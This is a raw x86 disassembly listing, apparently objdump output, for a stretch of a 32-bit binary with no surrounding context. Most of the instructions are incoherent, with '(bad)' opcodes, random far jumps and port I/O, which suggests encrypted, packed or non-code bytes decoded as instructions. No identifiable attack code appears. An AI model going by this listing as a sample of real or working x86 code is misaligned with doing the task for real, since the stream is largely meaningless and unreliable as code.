  40d6d6:	push   es
  40d6d7:	xchg   DWORD PTR [eax],eax
  40d6d9:	retf   
  40d6da:	imul   bp,sp,0xb6e5
  40d6df:	jg     0x40d6d4
  40d6e1:	ret    
  40d6e2:	dec    edi
  40d6e3:	cmp    al,0x94
  40d6e5:	mov    edx,0xf5756ab3
  40d6ea:	inc    ecx
  40d6eb:	in     eax,0x83
  40d6ed:	fisubr DWORD PTR [edi]
  40d6ef:	sbb    bh,ch
  40d6f1:	jbe    0x40d750
  40d6f3:	mov    ebx,0x337adbe4
  40d6f8:	ror    DWORD PTR [ebx-0x7372f7b3],1
  40d6fe:	or     bl,BYTE PTR [ebp+0x3b003272]
  40d704:	enter  0x850f,0x1e
  40d708:	cli    
  40d709:	(bad)  
  40d70a:	dec    DWORD PTR [ebx+0x5e9de]
  40d710:	add    BYTE PTR [eax],al
  40d712:	mov    ebx,0x32729d
  40d717:	mov    eax,DWORD PTR [ebp-0x4]
  40d71a:	xor    eax,0x7510856
  40d71f:	add    eax,ebx
  40d721:	mov    DWORD PTR [ebp-0xc],eax
  40d724:	xor    ebx,ebx
  40d726:	lea    eax,[ebp-0x10]
  40d729:	add    ebx,DWORD PTR [eax]
  40d72b:	jmp    0x40d889
  40d730:	xchg   ebp,eax
  40d731:	pop    es
  40d732:	mov    ds:0xa5aabdfe,eax
  40d737:	cmp    eax,0xb6db83b1
  40d73c:	les    esp,FWORD PTR [ebx-0x48]
  40d73f:	jne    0x40d742
  40d741:	cmp    BYTE PTR [esi+0x7e],0x3f
  40d745:	jg     0x40d7c5
  40d747:	jle    0x40d7c5
  40d749:	imul   ecx,DWORD PTR es:[edx+0x67],0x40
  40d74e:	das    
  40d74f:	cmc    
  40d750:	das    
  40d751:	inc    esp
  40d752:	and    esi,esp
  40d754:	xchg   ecx,eax
  40d755:	inc    ebx
  40d756:	sbb    BYTE PTR [edx+0x26],0x9c
  40d75a:	push   ebx
  40d75b:	icebp  
  40d75c:	xor    eax,0x1992cea9
  40d761:	jg     0x40d745
  40d763:	jle    0x40d7ac
  40d765:	loopne 0x40d73f
  40d767:	jg     0x40d7a9
  40d769:	adc    DWORD PTR [eax],ebp
  40d76b:	push   ds
  40d76c:	ret    
  40d76d:	cmp    BYTE PTR [edx],cl
  40d76f:	mov    ds:0xb76d46c5,al
  40d774:	mov    ds:0x43efd06d,eax
  40d779:	ins    DWORD PTR es:[edi],dx
  40d77a:	pop    ss
  40d77b:	add    ah,dl
  40d77d:	lahf   
  40d77e:	pop    ecx
  40d77f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d780:	popa   
  40d781:	inc    ecx
  40d782:	push   ebx
  40d783:	pop    edx
  40d784:	mov    ch,0x19
  40d786:	popa   
  40d787:	dec    ebx
  40d788:	and    eax,0x255e0d20
  40d78d:	and    al,0x4f
  40d78f:	xor    DWORD PTR [edx+0x7c47bc86],0x97ae504f
  40d799:	and    esp,esi
  40d79b:	ret    0xc5e1
  40d79e:	popa   
  40d79f:	aas    
  40d7a0:	ret    
  40d7a1:	pop    ebp
  40d7a2:	loop   0x40d728
  40d7a4:	inc    BYTE PTR ds:0x1859b7c8
  40d7aa:	ds pop ds
  40d7ac:	int3   
  40d7ad:	in     al,0xde
  40d7af:	pop    ebx
  40d7b0:	inc    ecx
  40d7b1:	mov    esp,0x2871732a
  40d7b6:	mov    eax,fs
  40d7b8:	add    BYTE PTR [edx],dh
  40d7ba:	push   edx
  40d7bb:	je     0x40d7ca
  40d7bd:	inc    eax
  40d7be:	xlat   BYTE PTR ds:[ebx]
  40d7bf:	add    BYTE PTR [esi],cl
  40d7c1:	repz neg edx
  40d7c4:	dec    eax
  40d7c5:	ja     0x40d7e6
  40d7c7:	pop    ebp
  40d7c8:	mov    edx,eax
  40d7ca:	push   es
  40d7cb:	sbb    esp,DWORD PTR [eax-0x31f61c14]
  40d7d1:	lods   eax,DWORD PTR ds:[esi]
  40d7d2:	lahf   
  40d7d3:	aaa    
  40d7d4:	scas   al,BYTE PTR es:[edi]
  40d7d5:	mov    dh,ah
  40d7d7:	add    ah,dh
  40d7d9:	mov    ds:0xf86a466a,al
  40d7de:	inc    esi
  40d7df:	call   DWORD PTR [esi]
  40d7e1:	inc    esi
  40d7e2:	jne    0x40d83f
  40d7e4:	fcmovbe st,st(4)
  40d7e6:	aad    0xaf
  40d7e8:	rcl    BYTE PTR [esi+0x6861afe7],0x19
  40d7ef:	jmp    0x1fa22a6f
  40d7f4:	xor    al,0x8a
  40d7f6:	inc    ebx
  40d7f7:	push   cs
  40d7f8:	fild   QWORD PTR [eax]
  40d7fa:	loop   0x40d80e
  40d7fc:	in     eax,dx
  40d7fd:	jno    0x40d788
  40d7ff:	mov    dl,0xbe
  40d801:	bound  edx,QWORD PTR [ecx-0x6af24676]
  40d807:	test   al,0x4a
  40d809:	leave  
  40d80a:	mov    eax,ds:0xbfe2df9e
  40d80f:	(bad)  [eax+0x79900316]
  40d815:	frstor [ecx+0x6cc8df2a]
  40d81b:	sbb    edx,esp
  40d81d:	mov    edi,0xe8cac2a
  40d822:	ret    
  40d823:	scas   al,BYTE PTR es:[edi]
  40d824:	aas    
  40d825:	fdivr  QWORD PTR [ecx]
  40d827:	mov    ds:0xd442a9b7,eax
  40d82c:	sub    bl,bh
  40d82e:	or     bl,BYTE PTR [ecx-0x1ef80a3a]
  40d834:	jnp    0x40d82c
  40d836:	gs ins DWORD PTR es:[edi],dx
  40d838:	in     eax,dx
  40d839:	stc    
  40d83a:	mov    bl,0x8e
  40d83c:	shl    dl,0x4d
  40d83f:	fistp  DWORD PTR [edi+0x63d3a3ad]
  40d845:	mov    esp,0xbb96cb1f
  40d84a:	xchg   esp,eax
  40d84b:	sub    ch,ah
  40d84d:	xadd   BYTE PTR [edx],bh
  40d850:	sbb    DWORD PTR [ebx],eax
  40d852:	stos   BYTE PTR es:[edi],al
  40d853:	retf   0x959c
  40d856:	rcl    DWORD PTR [edx+esi*2],0xd8
  40d85a:	lea    esi,[eax-0x7d]
  40d85d:	out    dx,eax
  40d85e:	cld    
  40d85f:	xchg   edi,eax
  40d860:	push   ebx
  40d861:	mov    ebx,0xa6fbe93f
  40d866:	aam    0xbd
  40d868:	popa   
  40d869:	mov    ch,0xb1
  40d86b:	jne    0x40d80f
  40d86d:	mov    al,0x24
  40d86f:	call   0xf673:0xe016166c
  40d876:	fld    QWORD PTR [ebx-0x2647ee1a]
  40d87c:	lea    ebp,[esi]
  40d87e:	call   0x18e0:0xe76db8a7
  40d885:	mov    DWORD PTR [edi-0x2d],0x33d3ff92
  40d88c:	fucomi st,st(1)
  40d88e:	pop    ecx
  40d88f:	add    DWORD PTR [eax],eax
  40d891:	add    dh,dh
  40d893:	arpl   WORD PTR [ebp+esi*2+0x7d97c57d],dx
  40d89a:	imul   eax,DWORD PTR [edx],0x51
  40d89d:	mov    edx,esi
  40d89f:	jmp    0x40d8b3
  40d8a1:	inc    dl
  40d8a3:	cmp    DWORD PTR [esi+0x7e],0x7e7e7f3f
  40d8aa:	jecxz  0x40d837
  40d8ac:	dec    ecx
  40d8ad:	cmp    eax,0x189c7c8e
  40d8b2:	loop   0x40d879
  40d8b4:	push   edx
  40d8b5:	aam    0xe7
  40d8b7:	and    bl,bl
  40d8b9:	adc    DWORD PTR [ebp-0x2f2a5c52],0xffffff93
  40d8c0:	and    dh,bl
  40d8c2:	retf   
  40d8c3:	lds    edx,FWORD PTR [ebx+ebx*4+0x7b]
  40d8c7:	ja     0x40d87a
  40d8c9:	inc    edi
  40d8ca:	clc    
  40d8cb:	fisubr DWORD PTR ds:[ecx+0xd080673]
  40d8d2:	dec    edi
  40d8d3:	dec    eax
  40d8d4:	or     DWORD PTR [ecx+0x6c],edi
  40d8d7:	jge    0x40d902
  40d8d9:	mov    ds:0x45eff742,eax
  40d8de:	dec    esi
  40d8df:	mov    eax,ds:0x9e5bcc17
  40d8e4:	jmp    0x6f9c:0x83c2
  40d8ea:	push   ebx
  40d8eb:	push   0x8f91f28b
  40d8f0:	xor    eax,0x7738f36c
  40d8f5:	mov    dl,0x73
  40d8f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8f8:	std    
  40d8f9:	dec    esi
  40d8fa:	xchg   edx,eax
  40d8fb:	test   DWORD PTR [ecx-0x2f],edi
  40d8fe:	push   0x28
  40d900:	fisttp WORD PTR [edx-0x37e26673]
  40d906:	arpl   cx,cx
  40d908:	inc    ebx
  40d909:	push   ebp
  40d90a:	or     al,0xb0
  40d90c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d90d:	adc    BYTE PTR [edi],bl
  40d90f:	(bad)  
  40d910:	aad    0x13
  40d912:	jnp    0x40d936
  40d914:	imul   ecx,DWORD PTR [edi-0x28],0x48580a30
  40d91b:	add    al,0x65
  40d91d:	nop
  40d91e:	xchg   ebp,eax
  40d91f:	jge    0x40d90b
  40d921:	mov    ds:0x4ddbe5ec,al
  40d926:	test   al,0xc
  40d928:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d929:	in     eax,dx
  40d92a:	lds    ebx,FWORD PTR [edi+0x78]
  40d92d:	adc    ebp,ecx
  40d92f:	adc    DWORD PTR [edx+0x774cbe72],esp
  40d935:	hlt    
  40d936:	ss ds dec esp
  40d939:	pop    ecx
  40d93a:	scas   al,BYTE PTR es:[edi]
  40d93b:	pop    edx
  40d93c:	adc    DWORD PTR [edx+0x30],0xfffffff7
  40d940:	dec    esi
  40d941:	xchg   edx,eax
  40d942:	push   edx
  40d943:	mov    BYTE PTR [ecx],al
  40d945:	rol    dh,1
  40d947:	xchg   ebp,eax
  40d948:	pushf  
  40d949:	ret    0x92b4
  40d94c:	iret   
  40d94d:	cmp    cl,bl
  40d94f:	mov    ch,0x24
  40d951:	and    BYTE PTR [ebx+0x63],bl
  40d954:	dec    ebp
  40d955:	aas    
  40d956:	int    0xe1
  40d958:	adc    dl,dh
  40d95a:	jmp    0xc1f660e5
  40d95f:	mov    WORD PTR [ebp+0x5b],fs
  40d962:	enter  0xb6d8,0x34
  40d966:	mov    esp,0x60f0c314
  40d96b:	mov    edx,ebp
  40d96d:	(bad)  
  40d96e:	cwde   
  40d96f:	pop    es
  40d970:	lea    eax,[esi]
  40d972:	dec    ebp
  40d973:	fdivr  DWORD PTR cs:[ebp+0x4557f5a0]
  40d97a:	fcmovb st,st(7)
  40d97c:	arpl   WORD PTR [edi-0x6803f1d3],di
  40d982:	loopne 0x40d9a6
  40d984:	dec    edi
  40d985:	sbb    BYTE PTR [ebx],0x54
  40d988:	mov    esi,0x4b48555a
  40d98d:	dec    ebx
  40d98e:	test   eax,0xc82c5c08
  40d993:	sbb    esp,DWORD PTR [esi]
  40d995:	(bad)  
  40d996:	cmc    
  40d997:	inc    ebp
  40d998:	add    DWORD PTR [edi+ecx*4],eax
  40d99b:	push   eax
  40d99c:	add    al,0x95
  40d99e:	xor    al,bh
  40d9a0:	mov    ebp,0x46a70833
  40d9a5:	int    0x60
  40d9a7:	outs   dx,BYTE PTR ds:[esi]
  40d9a8:	out    0x65,eax
  40d9aa:	xchg   esi,eax
  40d9ab:	ret    0x814e
  40d9ae:	fild   WORD PTR [edx-0x3cb118e]
  40d9b4:	stos   DWORD PTR es:[edi],eax
  40d9b5:	fstp   st(3)
  40d9b7:	push   esp
  40d9b8:	fsub   QWORD PTR [esi+0x6b]
  40d9bb:	mov    esp,0x770fd03
  40d9c0:	dec    edi
  40d9c1:	mov    ah,BYTE PTR [edi-0x7c]
  40d9c4:	jmp    0x89e39ada
  40d9c9:	popf   
  40d9ca:	xor    BYTE PTR [esi],dl
  40d9cc:	cmp    BYTE PTR [ebp+0x2a],dh
  40d9cf:	ror    BYTE PTR [eiz*8-0x406c3ff5],0xf0
  40d9d7:	inc    ebp
  40d9d8:	fwait
  40d9d9:	dec    ecx
  40d9da:	and    ebp,ecx
  40d9dc:	std    
  40d9dd:	push   ecx
  40d9de:	loopne 0x40da09
  40d9e0:	add    al,0xbc
  40d9e2:	les    ecx,FWORD PTR [ebp+0x1f]
  40d9e5:	out    dx,al
  40d9e6:	inc    ebp
  40d9e7:	jmp    0x59e9:0x43c0221a
  40d9ee:	add    DWORD PTR [eax],eax
  40d9f0:	add    BYTE PTR [ebx-0xc],dh
  40d9f3:	aas    
  40d9f4:	mov    DWORD PTR [ecx-0x6573b2b3],esi
  40d9fa:	cmp    BYTE PTR [edx+0x77],bl
  40d9fd:	dec    esp
  40d9fe:	arpl   WORD PTR [ecx],ax
  40da00:	jp     0x40d985
  40da02:	cmp    BYTE PTR [esi+0x7e],0x3f
  40da06:	jg     0x40da86
  40da08:	jle    0x40da67
  40da0a:	pop    edx
  40da0b:	(bad)  
  40da0c:	aas    
  40da0d:	and    eax,0x8229c132
  40da12:	outs   dx,BYTE PTR ds:[esi]
  40da13:	jmp    0x8cc6:0xe4984102
  40da1a:	ja     0x40d9e0
  40da1c:	xor    BYTE PTR [edx+0x16bb6b17],0xfa
  40da23:	xor    al,0xa5
  40da25:	add    esi,ebp
  40da27:	xchg   edi,eax
  40da28:	inc    edx
  40da29:	jmp    0xdfce:0x2075c48b
  40da30:	inc    esp
  40da31:	pop    ebp
  40da32:	mov    edi,0x3ee5ed36
  40da37:	aaa    
  40da38:	sub    DWORD PTR [edi],ecx
  40da3a:	sub    DWORD PTR [ecx+0x58],esp
  40da3d:	in     eax,0x90
  40da3f:	fmul   QWORD PTR [ebx+0x2d0813f8]
  40da45:	pop    edx
  40da46:	icebp  
  40da47:	test   BYTE PTR [edi-0x63],0x86
  40da4b:	xor    bl,BYTE PTR [esp+ebp*8+0x4c77e34f]
  40da52:	mov    ecx,0x86f10273
  40da57:	and    eax,0xf8443ad9
  40da5c:	sub    BYTE PTR [esp+ecx*1+0x477cd5d9],ah
  40da63:	jge    0x40dabe
  40da65:	mov    bh,BYTE PTR ds:0xd3d1b744
  40da6b:	pop    ebp
  40da6c:	loope  0x40da4c
  40da6e:	push   ecx
  40da6f:	add    BYTE PTR [ebx],dh
  40da71:	neg    BYTE PTR [ebx*1-0x15b7a5e9]
  40da78:	jns    0x40da85
  40da7a:	aad    0x30
  40da7c:	jns    0x40da98
  40da7e:	dec    esp
  40da7f:	call   0xf9841f3e
  40da84:	cmp    ebp,DWORD PTR [ecx-0x3792e557]
  40da8a:	fnstsw ax
  40da8c:	jecxz  0x40da34
  40da8e:	and    BYTE PTR [ebx-0x22],al
  40da91:	popa   
  40da92:	cmc    
  40da93:	ins    BYTE PTR es:[edi],dx
  40da94:	loopne 0x40dac1
  40da96:	fisub  WORD PTR [edi+0x5514c6dc]
  40da9c:	fs nop
  40da9e:	add    al,0x5
  40daa0:	test   al,0xc2
  40daa2:	xor    al,0x40
  40daa4:	(bad)  
  40daa5:	pusha  
  40daa6:	mov    ch,0x9e
  40daa8:	xchg   DWORD PTR [edx+0x2df0ca18],edi
  40daae:	sub    al,0x98
  40dab0:	or     dl,cl
  40dab2:	xchg   ebx,eax
  40dab3:	xlat   BYTE PTR ds:[ebx]
  40dab4:	cdq    
  40dab5:	(bad)  
  40dab7:	xor    al,0x1c
  40dab9:	xor    ah,BYTE PTR [edx+0x1]
  40dabc:	sub    cl,BYTE PTR [ebx]
  40dabe:	repz fdiv DWORD PTR [ebx-0x4619304e]
  40dac5:	mov    ebx,0xe4077cb4
  40daca:	js     0x40dad0
  40dacc:	pop    edi
  40dacd:	push   0xffffffe9
  40dacf:	hlt    
  40dad0:	rep outs dx,BYTE PTR ds:[esi]
  40dad2:	(bad)  
  40dad3:	test   al,0xe0
  40dad5:	mov    esi,0x9103b34c
  40dada:	imul   eax,DWORD PTR [ecx-0x45dc237a],0x7f
  40dae1:	lock or BYTE PTR [esi+0x4587483e],dh
  40dae8:	icebp  
  40dae9:	in     al,0x4e
  40daeb:	mov    DWORD PTR ds:0xba5f505,ebp
  40daf1:	lock adc al,0xb2
  40daf4:	in     eax,dx
  40daf5:	pop    ebp
  40daf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40daf7:	or     DWORD PTR [ebp-0x4a9ff970],0xffffffb1
  40dafe:	inc    edi
  40daff:	fadd   DWORD PTR [esi+0x75]
  40db02:	xor    edi,edi
  40db04:	jp     0x40dad6
  40db06:	or     DWORD PTR [ecx-0x75dd88d9],eax
  40db0c:	jmp    0xa56150b1
  40db11:	mov    ecx,0x950b6155
  40db16:	(bad)  
  40db18:	das    
  40db19:	dec    esi
  40db1a:	icebp  
  40db1b:	xchg   ebp,eax
  40db1c:	daa    
  40db1d:	int3   
  40db1e:	adc    DWORD PTR [edi+0x436229ce],edi
  40db24:	outs   dx,DWORD PTR ds:[esi]
  40db25:	aad    0x8c
  40db27:	and    edi,ebx
  40db29:	add    BYTE PTR [ecx+0x20caf277],cl
  40db2f:	enter  0x7ce8,0x9d
  40db33:	mov    bl,0xd4
  40db35:	push   edi
  40db36:	mov    ebp,0xdb56cd9a
  40db3b:	inc    ebp
  40db3c:	sbb    dh,dh
  40db3e:	push   ecx
  40db3f:	ficom  WORD PTR [esi]
  40db41:	sub    DWORD PTR [eax+edx*8],0x8
  40db45:	lods   al,BYTE PTR ds:[si]
  40db47:	ss movs BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40db4a:	cmp    DWORD PTR [ebp+0x10],ebx
  40db4d:	je     0x40df85
  40db53:	jmp    0x40dcb1
  40db58:	xchg   ebp,eax
  40db59:	mov    BYTE PTR [esi-0x42c354e4],bl
  40db5f:	mov    ecx,0xd105ab5
  40db64:	adc    dh,bh
  40db66:	pop    ebp
  40db67:	jmp    0x40dbad
  40db69:	cmp    DWORD PTR [esi+0x7e],0x3f
  40db6d:	jg     0x40dbed
  40db6f:	jle    0x40db3d
  40db71:	dec    esi
  40db72:	dec    esp
  40db73:	push   edx
  40db74:	out    0x30,al
  40db76:	and    edx,ebp
  40db78:	call   0xb29e:0x36bda91b
  40db7f:	jp     0x52c4221b
  40db85:	lea    edx,[eax]
  40db87:	adc    esp,eax
  40db89:	sbb    al,0x8c
  40db8b:	loopne 0x40dbf0
  40db8d:	pusha  
  40db8e:	inc    edx
  40db8f:	retf   
  40db90:	into   
  40db91:	aad    0x82
  40db93:	mov    eax,DWORD PTR [eax+0x37528fbe]
  40db99:	pop    esp
  40db9b:	scas   al,BYTE PTR es:[edi]
  40db9c:	push   0x42ea5c22
  40dba1:	dec    esi
  40dba2:	pop    edi
  40dba3:	jo     0x40dbbb
  40dba5:	ins    DWORD PTR es:[edi],dx
  40dba6:	inc    edi
  40dba7:	mov    ah,0xa2
  40dba9:	mov    ch,0x4d
  40dbab:	pop    edx
  40dbac:	das    
  40dbad:	sub    BYTE PTR [ecx-0x706adb0e],dh
  40dbb3:	es pop esp
  40dbb5:	push   ss
  40dbb6:	inc    ebx
  40dbb7:	ss ins BYTE PTR es:[edi],dx
  40dbb9:	shl    BYTE PTR [ecx+eax*2],cl
  40dbbc:	adc    eax,0xc3448605
  40dbc1:	test   DWORD PTR [esi],eax
  40dbc3:	popf   
  40dbc4:	retf   
  40dbc5:	stc    
  40dbc6:	mov    bl,0x98
  40dbc8:	lahf   
  40dbc9:	inc    esp
  40dbca:	mov    esi,0x76049bcf
  40dbcf:	shl    BYTE PTR [ecx],cl
  40dbd1:	adc    DWORD PTR [esi-0x1d],edi
  40dbd4:	xlat   BYTE PTR ds:[ebx]
  40dbd5:	dec    eax
  40dbd6:	(bad)  
  40dbd8:	loop   0x40dc49
  40dbda:	pop    eax
  40dbdb:	xor    al,0x4a
  40dbdd:	mov    ebx,0x1ff82f0d
  40dbe2:	mov    edi,DWORD PTR [ebp-0x1b]
  40dbe5:	xor    ebp,DWORD PTR [ecx+ebp*2]
  40dbe8:	add    cl,BYTE PTR [ecx]
  40dbea:	mov    ch,BYTE PTR [ecx-0x1e6cef3]
  40dbf0:	push   0x1
  40dbf2:	push   ebx
  40dbf3:	pop    ecx
  40dbf4:	mov    esi,0xff5d21ac
  40dbf9:	out    0xdc,al
  40dbfb:	xor    eax,0xd2653757
  40dc00:	or     BYTE PTR [ebx+ebx*2-0x79f1b033],ch
  40dc07:	push   ds
  40dc08:	ja     0x40dc81
  40dc0a:	in     al,0x4d
  40dc0c:	test   DWORD PTR [ebx-0x31],ebx
  40dc0f:	popf   
  40dc10:	sbb    dh,BYTE PTR [ecx]
  40dc12:	jle    0x40dc02
  40dc14:	fisttp WORD PTR [ebp+0x46]
  40dc17:	and    DWORD PTR [ebp+0x39428633],0xd145a577
  40dc21:	out    dx,eax
  40dc22:	or     BYTE PTR [ebx],al
  40dc24:	push   edi
  40dc25:	add    eax,ecx
  40dc27:	dec    ebx
  40dc28:	xor    dh,BYTE PTR [esi+0x85ffeb0]
  40dc2e:	jae    0x40dc72
  40dc30:	sbb    DWORD PTR [eax+ebp*1+0x61],edi
  40dc34:	push   ds
  40dc35:	sub    al,0xee
  40dc37:	test   al,0x42
  40dc39:	sub    ebx,edi
  40dc3b:	in     eax,dx
  40dc3c:	xor    DWORD PTR [edi],ebp
  40dc3e:	jp     0x40dbe7
  40dc40:	cwde   
  40dc41:	addr16 mov ecx,0xc4fb5647
  40dc47:	daa    
  40dc48:	mov    al,0xa8
  40dc4a:	mov    bl,BYTE PTR [eax+0x2d]
  40dc4d:	out    dx,eax
  40dc4e:	stc    
  40dc4f:	pop    esi
  40dc50:	add    eax,0x77929286
  40dc55:	mov    dh,0xbe
  40dc57:	shr    DWORD PTR [edi+0x66d7628],cl
  40dc5d:	dec    eax
  40dc5e:	pop    ds
  40dc5f:	pop    es
  40dc60:	mov    esi,0x6d89e0a6
  40dc65:	mov    es,WORD PTR [eax+0x15e88ac1]
  40dc6b:	push   edi
  40dc6c:	test   dh,bl
  40dc6e:	sbb    edi,0x56
  40dc71:	rcr    esp,1
  40dc73:	scas   eax,DWORD PTR es:[edi]
  40dc74:	push   ds
  40dc75:	xor    ebp,DWORD PTR [ecx]
  40dc77:	add    ebx,edx
  40dc79:	jle    0x40dc6b
  40dc7b:	add    DWORD PTR [ebx+edi*8-0x661dfcda],eax
  40dc82:	cmp    cl,BYTE PTR ds:0x9f1872a9
  40dc88:	dec    eax
  40dc89:	(bad)
  40dc8c:	mov    edi,0x55f44f1a
  40dc91:	retf   0x5aab
  40dc94:	enter  0x8ba2,0x46
  40dc98:	aam    0xb4
  40dc9a:	mov    al,ds:0x309dc0d1
  40dc9f:	cmp    ebp,esp
  40dca1:	pop    ds
  40dca2:	es add al,0x76
  40dca5:	scas   eax,DWORD PTR es:[edi]
  40dca6:	push   ss
  40dca7:	dec    ecx
  40dca8:	pop    ebp
  40dca9:	dec    ebp
  40dcaa:	mov    edx,0xfc91466a
  40dcaf:	or     esi,0x159e992
  40dcb5:	add    BYTE PTR [eax],al
  40dcb7:	dec    eax
  40dcb8:	adc    eax,0xdc7bcafb
  40dcbd:	jns    0x40dc54
  40dcbf:	rcl    BYTE PTR ds:0x94d53fe9,cl
  40dcc5:	(bad)  
  40dcc6:	ins    DWORD PTR es:[edi],dx
  40dcc7:	add    eax,0x3f7e7e85
  40dccc:	jg     0x40dd4c
  40dcce:	jle    0x40dcfe
  40dcd0:	xor    DWORD PTR [ecx],ebp
  40dcd2:	mov    ecx,DWORD PTR [edi+0xc070c0f]
  40dcd8:	cmp    bh,ch
  40dcda:	cmp    al,0xc1
  40dcdc:	xchg   esi,eax
  40dcdd:	idiv   esi
  40dcdf:	mov    ecx,0x33417966
  40dce4:	jne    0x40dc73
  40dce6:	add    eax,0x125a0fa7
  40dceb:	addr16 int3 
  40dced:	mov    dl,0x62
  40dcef:	inc    edx
  40dcf0:	outs   dx,DWORD PTR ds:[esi]
  40dcf1:	pop    ecx
  40dcf2:	push   ebx
  40dcf3:	imul   edx,DWORD PTR [bx+di-0x15],0x7b
  40dcf8:	inc    ebx
  40dcf9:	loope  0x40dc81
  40dcfb:	gs inc ebx
  40dcfd:	push   cs
  40dcfe:	jg     0x40dce9
  40dd00:	js     0x40dc9e
  40dd02:	mov    al,ds:0x7a02742b
  40dd07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd08:	sbb    al,BYTE PTR [ebx+0x45]
  40dd0b:	jbe    0x40dc8e
  40dd0d:	push   ss
  40dd0e:	out    dx,al
  40dd0f:	xchg   ebp,eax
  40dd10:	pop    ecx
  40dd11:	aam    0xd9
  40dd13:	xor    DWORD PTR [esi],ebx
  40dd15:	outs   dx,DWORD PTR ds:[esi]
  40dd16:	imul   ecx,DWORD PTR [ecx+0xd],0xe3da8859
  40dd1d:	div    esi
  40dd1f:	dec    eax
  40dd20:	repz jmp 0x77c6:0xbdc194cd
  40dd28:	out    dx,eax
  40dd29:	in     eax,0x1e
  40dd2b:	jo     0x40dcc6
  40dd2d:	sbb    ecx,DWORD PTR [eax]
  40dd2f:	lahf   
  40dd30:	cmp    ecx,DWORD PTR [eax+0x56]
  40dd33:	dec    ecx
  40dd34:	out    0x55,al
  40dd36:	dec    eax
  40dd37:	enter  0x13c2,0x2c
  40dd3b:	cli    
  40dd3c:	push   esi
  40dd3d:	rcl    DWORD PTR [ecx],cl
  40dd3f:	xor    edi,DWORD PTR [edi]
  40dd41:	mov    DWORD PTR [edx+eax*2+0x48e7b313],esp
  40dd48:	adc    eax,0x6f09fe4
  40dd4d:	in     eax,dx
  40dd4e:	mul    BYTE PTR [esi-0x6361a27b]
  40dd54:	sub    cl,BYTE PTR [ebx]
  40dd56:	sub    ch,BYTE PTR [eax-0x3ea0d519]
  40dd5c:	or     al,0xed
  40dd5e:	lock xchg ebx,eax
  40dd60:	std    
  40dd61:	jge    0x40dde0
  40dd63:	mov    ds:0x3ba92cdb,al
  40dd68:	scas   al,BYTE PTR es:[edi]
  40dd69:	push   0xab7a8c2e
  40dd6e:	fstp   DWORD PTR [eax]
  40dd70:	data16 xor BYTE PTR ss:[edi-0x7dd290a5],al
  40dd78:	or     eax,0x8b0c328e
  40dd7d:	cmp    ebx,ecx
  40dd7f:	retf   
  40dd80:	adc    eax,0x9485c651
  40dd85:	mov    ebp,0x99de824f
  40dd8a:	sub    esp,DWORD PTR [ebp+0x72d0db11]
  40dd90:	leave  
  40dd91:	inc    eax
  40dd92:	ins    BYTE PTR es:[edi],dx
  40dd93:	add    cl,BYTE PTR [eax-0x7a]
  40dd96:	xchg   esi,eax
  40dd97:	dec    esi
  40dd98:	inc    eax
  40dd99:	xchg   BYTE PTR [ecx+0x726a2378],bl
  40dd9f:	repnz mov eax,0x48af92d3
  40dda5:	push   cs
  40dda6:	jmp    0xf0cc:0x4521b87f
  40ddad:	inc    ecx
  40ddae:	js     0x40dde2
  40ddb0:	xchg   ecx,eax
  40ddb1:	sub    ecx,esi
  40ddb3:	pushf  
  40ddb4:	push   cs
  40ddb5:	test   cl,al
  40ddb7:	mov    bl,BYTE PTR [ebx+eax*8-0x618c00b9]
  40ddbe:	mov    esp,0x97a11efe
  40ddc3:	dec    ebx
  40ddc4:	aad    0xb4
  40ddc6:	inc    eax
  40ddc7:	aam    0x1
  40ddc9:	adc    eax,0xa6e4b1f4
  40ddce:	hlt    
  40ddcf:	mov    esp,0x9f7a4c26
  40ddd4:	js     0x40de38
  40ddd6:	jne    0x40de51
  40ddd8:	lahf   
  40ddd9:	dec    esp
  40ddda:	sahf   
  40dddb:	sub    BYTE PTR [eax+0x16017acb],cl
  40dde1:	imul   edi,DWORD PTR [edi-0x17],0x6806af94
  40dde8:	inc    esi
  40dde9:	or     dh,BYTE PTR [edx+0x5aae49dc]
  40ddef:	adc    ebx,DWORD PTR [edi-0x6f]
  40ddf2:	mov    dl,0xe2
  40ddf4:	ficomp WORD PTR [ecx]
  40ddf6:	iret   
  40ddf7:	or     ch,BYTE PTR [ecx+0x6067000]
  40ddfd:	lahf   
  40ddfe:	mov    bh,0x6
  40de00:	ror    DWORD PTR [ecx-0x64],0xd8
  40de04:	add    eax,0xe8f83062
  40de09:	call   0x8bdfd583
  40de0e:	mov    esi,0x590a6a02
  40de13:	push   0x4
  40de15:	pop    ebx
  40de16:	inc    ebx
  40de17:	xchg   ebx,ecx
  40de19:	jmp    0x40df77
  40de1e:	ss test al,0xe0
  40de21:	or     eax,0x6dfb5d60
  40de26:	mov    al,0x7d
  40de28:	jmp    0xd7a408d
  40de2d:	xchg   esp,eax
  40de2e:	mov    BYTE PTR [esi+0x7f3f7e7e],0x7e
  40de35:	jle    0x40de34
  40de37:	(bad)  
  40de38:	out    0x86,eax
  40de3a:	xor    eax,0xcfdd267e
  40de3f:	pop    ebx
  40de40:	out    0x3e,eax
  40de42:	pop    edi
  40de43:	xor    dh,dl
  40de45:	leave  
  40de46:	pop    esp
  40de47:	adc    eax,0x2849cae9
  40de4c:	cmp    dl,ah
  40de4e:	out    0xa8,eax
  40de50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de51:	mov    WORD PTR [esi],cs
  40de53:	enter  0xc4a3,0x8d
  40de57:	daa    
  40de58:	sub    BYTE PTR ds:0xd5e023eb,cl
  40de5e:	add    DWORD PTR [esi],esi
  40de60:	cli    
  40de61:	aaa    
  40de62:	inc    esp
  40de63:	jae    0x40dec2
  40de65:	pop    es
  40de66:	mov    eax,eax
  40de68:	fcos   
  40de6a:	jmp    0x69ba:0x68a93775
  40de71:	fbld   TBYTE PTR [edi-0x155d44e6]
  40de77:	and    BYTE PTR [edi+0x4d148846],bl
  40de7d:	or     al,0x2b
  40de7f:	adc    bl,BYTE PTR [esi]
  40de81:	mov    ah,0x44
  40de83:	aam    0x14
  40de85:	xchg   BYTE PTR [esi],ch
  40de87:	clc    
  40de88:	add    BYTE PTR [ecx-0x6667d5e2],bh
  40de8e:	dec    ebp
  40de8f:	sbb    BYTE PTR [edx+0x5b],bh
